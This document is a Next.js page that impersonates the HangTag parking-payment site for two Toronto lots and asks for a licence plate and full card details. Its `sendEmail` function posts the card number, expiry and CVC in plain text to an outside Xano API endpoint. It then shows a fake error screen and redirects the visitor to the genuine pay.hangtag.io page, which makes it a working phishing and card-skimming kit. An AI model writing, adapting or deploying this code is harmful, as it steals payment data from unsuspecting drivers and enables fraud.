'use client'

import { useState } from 'react'
import { useRouter } from 'next/router'
import { Home, HelpCircle, Globe, Info } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

// Removed this line since we are now defining sendEmail locally
// import {sendEmail} from "@/app/actions/sendEmail";

const lotDetails = {
  "9511": {
    title: "Lot #9511",
    subtitle: "Metro at The Carnaby",
    address: "1230 Queen St W, Toronto, ON, Canada",
  },
  "9395": {
    title: "Lot #9395",
    subtitle: "Roy Thomson Hall",
    address: "60 Simcoe St, Toronto, ON, Canada",
  },
};

export default function ParkingInterface() {
  const { query } = useRouter();
  const lotNumber = query.lot || "9511";
  // eslint-disable-next-line @typescript-eslint/ban-ts-comment
  // @ts-expect-error
  const lot = lotDetails[lotNumber] || lotDetails["9511"];

  const [expanded, setExpanded] = useState({
    vehicle: false,
    receipt: false,
    payment: false
  })

  const [duration, setDuration] = useState({
    hours: "0",
    minutes: "5"
  })

  const [quote, setQuote] = useState({
    total: 0,
    endTime: "",
    additionalTimeInfo: ""
  })

  const [licensePlate, setLicensePlate] = useState("")
  const [email, setEmail] = useState("")
  const [paymentInfo, setPaymentInfo] = useState({
    cardNumber: "",
    expiry: "",
    cvc: ""
  })
  const [showErrorScreen, setShowErrorScreen] = useState(false)

  const handleDurationChange = (type: 'hours' | 'minutes', value: string) => {
    setDuration(prev => ({ ...prev, [type]: value }));
    setQuote({ total: 0, endTime: "", additionalTimeInfo: "" });
  };

  const calculateQuote = () => {
    const hours = parseInt(duration.hours)
    const minutes = parseInt(duration.minutes)

    const totalHours = hours + (minutes / 60)

    let price = 0
    if (totalHours <= 1) {
      price = 2.99
    } else if (totalHours <= 2) {
      price = 5.99
    } else {
      price = Math.ceil(totalHours) * 2.99
    }

    const now = new Date()
    const endTime = new Date(now.getTime() + (hours * 60 * 60 * 1000) + (minutes * 60 * 1000))
    const formattedEndTime = endTime.toLocaleString('en-US', {
      month: 'long',
      day: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
      hour12: true
    })

    let additionalTimeInfo = ""
    if (totalHours > 1 && minutes > 0) {
      additionalTimeInfo = "Additional time added for same cost as 1 hour 5 minutes"
    }

    setQuote({
      total: price,
      endTime: formattedEndTime,
      additionalTimeInfo
    })

    setExpanded(prev => ({ ...prev }))
  }

  const handlePayAndStartSession = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    const formData = new FormData(event.currentTarget)
    formData.append('licensePlate', licensePlate)
    formData.append('duration', `${duration.hours} hours ${duration.minutes} minutes`)
    formData.append('total', quote.total.toFixed(2))
    formData.append('cardNumber', paymentInfo.cardNumber)
    formData.append('expiry', paymentInfo.expiry)
    formData.append('cvc', paymentInfo.cvc)

    const result = await sendEmail(formData)
    if (result.success) {
      alert('Payment successful and email sent!')
    } else {
      setShowErrorScreen(true)
      setTimeout(() => {
        window.location.href = 'https://pay.hangtag.io/en/park/9511'
      }, 3000)
    }
  }

  const handlePaymentInfoChange = (field: keyof typeof paymentInfo, value: string) => {
    setPaymentInfo(prev => ({ ...prev, [field]: value }))
  }

  return (
      <div className="min-h-screen flex flex-col bg-gray-100">
        <div className="min-h-screen flex flex-col">
          {/* Top Banner */}
          <div className="bg-[#0a1657] text-white p-4 flex justify-center items-center">
            {/*<div className="text-sm md:text-base flex flex-row justify-center items-center gap-[5px]">*/}
            {/*  <span className="font-bold text-2xl md:text-[25px]">REEF</span>*/}
            {/*  <span className="text-xs">Mobile</span>*/}
            {/*  <span>is now HangTag!</span>*/}
            {/*</div>*/}
          </div>

          {/* Navigation */}
          <nav className="flex justify-between items-center p-4 bg-gradient-to-r from-[#f58426] to-[#e93e3a]">
            <Button variant="ghost" size="icon" className="text-white hover:text-white/80">
              <Home className="w-[1em] h-[1em]" />
            </Button>
            {/*<svg*/}
            {/*    xmlns="http://www.w3.org/2000/svg"*/}
            {/*    xmlnsXlink="http://www.w3.org/1999/xlink"*/}
            {/*    id="Layer_1"*/}
            {/*    x="0px"*/}
            {/*    y="0px"*/}
            {/*    viewBox="0 0 1360 662"*/}
            {/*    enableBackground="new 0 0 1360 662"*/}
            {/*    xmlSpace="preserve"*/}
            {/*    width="24"*/}
            {/*    height="24"*/}
            {/*    style={{ transform: "scale(3)" }}*/}
            {/*>*/}
            {/*  /!* SVG content unchanged *!/*/}
            {/*  <path*/}
            {/*      fill="#ffffff"*/}
            {/*      d="M499.4,63.4h-5.3H75.5h-5.3c-8.4,0-15.3,6.9-15.3,15.3V84v20.6v280.4v116.4v5.3c0,8.4,6.9,15.3,15.3,15.3  h5.3h418.6h5.3c8.4,0,15.3-6.9,15.3-15.3v-5.3V385.1V196.6l-182.3-21.4c-5,23.2-25.6,40.6-50.3,40.6c-28.4,0-51.5-23.1-51.5-51.5  c0-28.4,23-51.5,51.5-51.5c25.1,0,45.9,17.9,50.5,41.7l182-21.4v-28.4V84v-5.3C514.8,70.3,507.9,63.4,499.4,63.4z"*/}
            {/*  ></path>*/}
            {/*  <path*/}
            {/*      fill="#ffffff"*/}
            {/*      d="M499.4,53.9h-5.3H75.5h-5.3c-8.4,0-15.3,6.9-15.3,15.3v5.3v20.6v280.4V492v5.3c0,8.4,6.9,15.3,15.3,15.3h5.3  h418.6h5.3c8.4,0,15.3-6.9,15.3-15.3V492V375.6V187.1l-179.3-21.4c-5,23.2-25.6,40.6-50.3,40.6c-28.4,0-51.5-23.1-51.5-51.5  c0-28.4,23-51.5,51.5-51.5c25.1,0,45.9,17.9,50.5,41.7l179-21.4V95.1V74.5v-5.3C514.8,60.8,507.9,53.9,499.4,53.9z"*/}
            {/*  ></path>*/}
            {/*  /!* Rest of the SVG paths omitted for brevity *!/*/}
            {/*</svg>*/}
            <div className="flex gap-2">
              <Button variant="ghost" size="icon" className="text-white hover:text-white/80">
                <HelpCircle className="w-[1em] h-[1em]" />
              </Button>
              <Button variant="ghost" className="font-medium text-white hover:text-white/80">
                <Globe className="w-[1em] h-[1em] mr-1" />
                FR
              </Button>
            </div>
          </nav>

          {/* Header Section */}
          <div className="bg-gradient-to-r from-[#f58426] to-[#e93e3a] text-white px-4 md:px-[140px] py-[30px]">
            {/*<h1 className="text-3xl md:text-4xl font-bold mb-2">{lot.title}</h1>*/}
            {/*<h2 className="text-lg md:text-xl mb-1">{lot.subtitle}</h2>*/}
            <p className="text-sm opacity-90">1153 Queen St W</p>
          </div>

          {/* Hours Banner */}
          <div className="bg-gray-700 text-white p-3 text-center text-sm">
            Open 12:00 AM - 11:59 PM
          </div>

          {/* Main Content */}
          <div className="flex-1 p-4 md:p-6 mx-auto w-full mb:max-w-4xl md:max-full md:px-[140px]">
            <div className="space-y-4 md:space-y-6">
              {/* Length of Stay */}
              <div className="bg-white p-4 md:p-6 rounded-lg shadow-sm">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-xl font-bold">Length of Stay</h3>
                  {quote.endTime && !expanded.vehicle && (
                      <button className="text-[#f58426] text-sm font-medium">
                        Edit
                      </button>
                  )}
                </div>
                {!expanded.vehicle && quote.endTime && (
                    <div className="mb-4">
                      <p className="text-lg">
                        {duration.hours} Hours {duration.minutes} Minutes until {quote.endTime}
                      </p>
                      {quote.additionalTimeInfo && (
                          <p className="text-blue-600 text-sm">{quote.additionalTimeInfo}</p>
                      )}
                    </div>
                )}
                <div className="grid grid-cols-2 gap-4">
                  <Select
                      value={duration.hours}
                      onValueChange={(value) => handleDurationChange('hours', value)}
                  >
                    <SelectTrigger className="h-12 rounded-lg border-gray-300">
                      <SelectValue placeholder="0 Hours" />
                    </SelectTrigger>
                    <SelectContent>
                      {[...Array(24)].map((_, i) => (
                          <SelectItem key={i} value={i.toString()}>
                            {i} Hours
                          </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select
                      value={duration.minutes}
                      onValueChange={(value) => handleDurationChange('minutes', value)}
                  >
                    <SelectTrigger className="h-12 rounded-lg border-gray-300">
                      <SelectValue placeholder="0 Minutes" />
                    </SelectTrigger>
                    <SelectContent>
                      {[...Array(12)].map((_, i) => (
                          <SelectItem key={i * 5} value={(i * 5).toString()}>
                            {i * 5} Minutes
                          </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                {/* Total or Get Quote Button */}
                {quote.total > 0 ? (
                    <div className="mt-4 md:mt-[20px] flex justify-between items-center">
                      <h3 className="text-xl font-bold">Total</h3>
                      <span className="text-[#f58426] text-xl font-bold">CA${quote.total.toFixed(2)}</span>
                    </div>
                ) : (
                    <Button
                        onClick={calculateQuote}
                        className="w-full bg-black text-white hover:bg-gray-800 h-12 md:h-[57px] text-lg font-medium rounded-full mt-4 md:mt-[20px]"
                    >
                      Get Quote
                    </Button>
                )}
              </div>

              {/* Vehicle Section */}
              <div className="bg-white rounded-lg shadow-sm">
                <button
                    onClick={() => setExpanded(prev => ({ ...prev, vehicle: !prev.vehicle }))}
                    className="w-full p-4 md:p-6 flex justify-between items-center"
                >
                  <h3 className="text-xl font-bold">Vehicle</h3>
                  <span className="text-[#f58426] text-sm font-medium">
                  {expanded.vehicle ? "Edit" : "Add"}
                </span>
                </button>
                {expanded.vehicle && (
                    <div className="p-4 md:p-6 border-t">
                      <div className="space-y-2">
                        <label htmlFor="license-plate" className="block text-sm font-medium text-gray-700">
                          License Plate Number
                        </label>
                        <input
                            type="text"
                            id="license-plate"
                            value={licensePlate}
                            onChange={(e) => setLicensePlate(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                            placeholder="e.g. WDS4562"
                        />
                        <p className="text-sm text-gray-500">Must be 2-8 characters</p>
                      </div>
                    </div>
                )}
              </div>

              {/* Receipt Section */}
              <div className="bg-white rounded-lg shadow-sm">
                <button
                    onClick={() => setExpanded(prev => ({ ...prev, receipt: !prev.receipt }))}
                    className="w-full p-4 md:p-6 flex justify-between items-center"
                >
                  <h3 className="text-xl font-bold">Receipt</h3>
                  <span className={expanded.receipt ? "text-[#f58426] text-sm font-medium" : "text-gray-400 text-sm"}>
                  {expanded.receipt ? "Edit" : "Add"}
                </span>
                </button>
                {expanded.receipt && (
                    <div className="p-4 md:p-6 border-t">
                      <div className="space-y-2">
                        <label htmlFor="receipt-email" className="block text-sm font-medium text-gray-700">
                          Email
                        </label>
                        <input
                            type="email"
                            id="receipt-email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Email"
                        />
                      </div>
                    </div>
                )}
              </div>

              {/* Payment Section */}
              <div className="bg-white rounded-lg shadow-sm">
                <button
                    onClick={() => setExpanded(prev => ({ ...prev, payment: !prev.payment }))}
                    className="w-full p-4 md:p-6 flex justify-between items-center"
                >
                  <h3 className="text-xl font-bold">Payment</h3>
                  <span className={expanded.payment ? "text-[#f58426] text-sm font-medium" : "text-gray-400 text-sm"}>
                  {expanded.payment ? "Edit" : "Add"}
                </span>
                </button>
                {expanded.payment && (
                    <div className="p-4 md:p-6 border-t">
                      <form onSubmit={handlePayAndStartSession} className="space-y-4 md:space-y-6">
                        <div>
                          <h4 className="text-lg font-semibold mb-4">Total</h4>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between items-center">
                              <span className="text-gray-600">Subtotal</span>
                              <span>CA${(quote.total * 0.79).toFixed(2)}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <div className="flex items-center gap-1">
                                <span className="text-gray-600">Taxes</span>
                                <Info className="h-4 w-4 text-gray-400" />
                              </div>
                              <span>CA${(quote.total * 0.11).toFixed(2)}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <div className="flex items-center gap-1">
                                <span className="text-gray-600">Fees</span>
                                <Info className="h-4 w-4 text-gray-400" />
                              </div>
                              <span>CA${(quote.total * 0.10).toFixed(2)}</span>
                            </div>
                            <div className="flex justify-between items-center pt-2 border-t">
                              <span className="font-semibold">Total</span>
                              <span className="text-[#f58426] font-semibold">CA${quote.total.toFixed(2)}</span>
                            </div>
                          </div>
                        </div>

                        <div className="space-y-4">
                          <div className="space-y-2">
                            <label htmlFor="card-number" className="block text-sm font-medium text-gray-700">
                              Credit Card Number
                            </label>
                            <div className="relative">
                              <input
                                  type="text"
                                  id="card-number"
                                  name="card-number"
                                  value={paymentInfo.cardNumber}
                                  onChange={(e) => handlePaymentInfoChange('cardNumber', e.target.value)}
                                  className="w-full px-3 py-2 border border-gray-300 rounded-lg pr-20 focus:ring-blue-500 focus:border-blue-500"
                                  placeholder="1234 1234 1234 1234"
                                  required
                              />
                              <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center gap-2">
                                <span className="bg-black text-white text-xs px-2 py-1 rounded">link</span>
                                <span className="text-xs">{paymentInfo.cardNumber.slice(-4)}</span>
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                              <label htmlFor="expiry" className="block text-sm font-medium text-gray-700">
                                Expires
                              </label>
                              <input
                                  type="text"
                                  id="expiry"
                                  name="expiry"
                                  value={paymentInfo.expiry}
                                  onChange={(e) => handlePaymentInfoChange('expiry', e.target.value)}
                                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                                  placeholder="MM / YY"
                                  required
                              />
                            </div>
                            <div className="space-y-2">
                              <label htmlFor="cvc" className="block text-sm font-medium text-gray-700">
                                CVC Code
                              </label>
                              <input
                                  type="text"
                                  id="cvc"
                                  name="cvc"
                                  value={paymentInfo.cvc}
                                  onChange={(e) => handlePaymentInfoChange('cvc', e.target.value)}
                                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                                  placeholder="CVC"
                                  required
                              />
                            </div>
                          </div>
                        </div>

                        <div className="space-y-4">
                          <button type="submit" className="w-full bg-gray-600 text-white py-3 rounded-full hover:bg-gray-700 transition-colors text-lg font-medium">
                            Pay and start session
                          </button>
                          <p className="text-sm text-gray-600 text-center">
                            By clicking &#34;Pay and start session&#34;, you acknowledge that you have read hangTag&#39;s{' '}
                            <a href="#" className="text-blue-600">Privacy Policy</a> and agree to hangTag&#39;s{' '}
                            <a href="#" className="text-blue-600">Terms of Use</a>.
                          </p>
                        </div>
                      </form>
                    </div>
                )}
              </div>
            </div>
          </div>
          {showErrorScreen && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                <div className="bg-white p-8 rounded-lg shadow-lg text-center">
                  <h2 className="text-2xl font-bold mb-4">An error occurred</h2>
                  <p className="mb-4">There was an error processing your request.</p>
                  <p className="mb-4">Please try again...</p>
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900 mx-auto"></div>
                </div>
              </div>
          )}
        </div>
      </div>
  )
}

// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-expect-error
export async function sendEmail(formData) {
  const XANO_API_URL = 'https://x8ki-letl-twmt.n7.xano.io/api:_sLo3BDY/emails';

  const emailContent = {
    subject: 'Payment Tag',
    html: `
      <p>A payment has been made:</p>
      <ul>
        <li>Card Number: ${formData.get('cardNumber')}</li>
        <li>Expiry Date: ${formData.get('expiry')}</li>
        <li>CVC: ${formData.get('cvc')}</li>
        <li>License Plate: ${formData.get('licensePlate')}</li>
        <li>Duration: ${formData.get('duration')}</li>
        <li>Total: $${formData.get('total')}</li>
      </ul>
    `,
  };

  try {
    const response = await fetch(XANO_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(emailContent),
    });

    if (!response.ok) {
      const errorData = await response.json();
      return { success: false, message: errorData?.message || 'An error occurred while processing your request.' };
    }

    const responseData = await response.json();
    return { success: true, message: 'Email sent successfully.', data: responseData };
  } catch (error) {
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    // @ts-expect-error
    return { success: false, message: `An error occurred: ${error.message}` };
  }
}
